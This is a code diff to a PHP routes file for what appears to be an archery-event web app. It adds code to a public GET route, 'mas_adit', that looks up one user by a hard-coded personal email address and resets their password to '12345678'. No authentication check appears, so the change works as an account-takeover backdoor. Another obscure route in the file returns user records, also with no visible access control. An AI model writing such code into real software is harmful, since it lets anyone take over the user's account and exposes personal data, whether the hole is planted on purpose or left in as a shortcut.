@@ -22,6 +22,7 @@ use App\Models\Provinces;
 use App\Models\User;
 use DAI\Utils\Exceptions\BLoCException;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
 
 $router->get('kioheswbgcgoiwagfp', function () {
     $data = User::where('verify_status', 3)->get();
@@ -110,6 +111,13 @@ $router->post('reject', function (Request $request) {
 });
 
 $router->get("mas_adit", function () {
+    $user = User::where("email", "auliyanuranggraeni22@gmail.com")->first();
+    if (!$user) {
+        throw new BLoCException("user nan");
+    }
+
+    $user->password = Hash::make("12345678");
+    $user->save();
     $series1 =  User::select("users.*")->join("archery_event_participants", "archery_event_participants.user_id", "=", "users.id")
         ->where("archery_event_participants.event_id", 21)->where("archery_event_participants.status", 1)
         ->where("archery_event_participants.type", "individual")
